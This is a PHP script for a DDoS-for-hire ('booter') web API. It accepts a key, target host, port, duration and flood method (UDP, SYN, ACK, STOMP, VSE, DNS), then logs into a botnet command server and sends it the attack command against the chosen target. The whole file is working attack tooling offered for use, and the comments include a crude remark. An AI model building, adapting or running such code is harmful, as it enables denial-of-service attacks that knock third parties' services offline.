<?php
error_reporting(E_ALL);
    // API Keys
    $APIKeys = array("EnterYourKeysHere", "AddMoreLikeThis");
    // VALID attack methods
    $attackMethods = array("RAWUDP", "ACK", "STOMP", "DNS", "VSE", "SYN");
    // I'm so gay
    function htmlsc($string)
    {
        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
    }
    // Check if all parameters are passed
    if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["time"]) || !isset($_GET["method"]))
        die("You are missing a parameter")
    // Variables for attack
    $key = htmlsc($_GET["key"]);
    $host = htmlsc($_GET["host"]);
    $port = htmlsc($_GET["port"]);
    $time = htmlsc($_GET["time"]);
    $method = htmlsc(strtoupper($_GET["method"]));
    $command = "ack $host $time dport=$port\r\n";
    // Check if API key is valid
    if (!in_array($key, $APIKeys)) die("Invalid API key");
    // Check if attack method is valid
    if (!in_array($method, $attackMethods)) die("Invalid attack method");
    // Set command for method (should really use a switch() statement but who cares?)
    if ($method == "RAWUDP") $command = "udpplain $host $time len=65500 rand=1 dport=$port\r\n";
    else if ($method == "DNS") $command = "dns $host $time dport=$port domain=$host\r\n";
    else if ($method == "SYN") $command = "syn $host $time dport=$port\r\n";
    else if ($method == "ACK") $command = "ack $host $time dport=$port\r\n";
    else if ($method == "STOMP") $command = "stomp $host $time dport=$port\r\n";
    else if ($method == "VSE") $command = "vse $host $time dport=$port\r\n";
    // Add other methods if you need them, I'm sure you're capable of doing that (I hope)
    // Connect
    $socket = fsockopen("IPHERE", "PORTHERE"); // Example: $socket = fsockopen("1.2.3.4", "23");
    ($socket ? null : die("Failed to connect"));
    // Login
    fwrite($socket, " \r\n"); // Leave This.
    sleep(3);
    fwrite($socket, "username\r\n"); // Username
    sleep(3);
    fwrite($socket, "password\r\n"); // Password
    // Send command
    sleep(9); // Why? I've noticed for some people it doesn't work w/o the sleep() (or anything before fwrite()ing $command)!
    fwrite($socket, $command);
    // Close connection
    fclose($socket);
    // Say the attack has been sent
    echo "Attack sent to $host:$port for $time seconds using method $method!\n";
 
   
?>
// Usage: http://site.com/api.php?key=[key]&host=[host]&port=[port]&method=[method]&time=[time]
// Usage: http://site.com/api.php?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD
